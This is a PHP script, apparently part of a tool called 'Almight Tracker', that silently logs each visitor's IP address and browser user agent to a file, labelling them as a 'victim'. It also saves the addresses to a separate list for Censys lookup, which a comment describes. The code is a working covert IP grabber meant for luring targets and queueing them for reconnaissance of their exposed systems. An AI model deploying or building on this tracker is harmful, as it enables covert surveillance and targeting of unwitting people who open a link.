<?php
// Almight Tracker v0.3 - IP Capture Module
// Enhanced with automatic Censys integration

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);


fclose($fp);

// Save IP to captured_ips.txt for Censys lookup
$captured_file = 'captured_ips.txt';
$ip_only = trim(str_replace(["\r", "\n"], '', $ipaddress));

// Check if IP already exists in the file to prevent duplicates
$existing_ips = [];
if (file_exists($captured_file)) {
    $existing_ips = file($captured_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}

if (!in_array($ip_only, $existing_ips)) {
    file_put_contents($captured_file, $ip_only . "\n", FILE_APPEND);
}
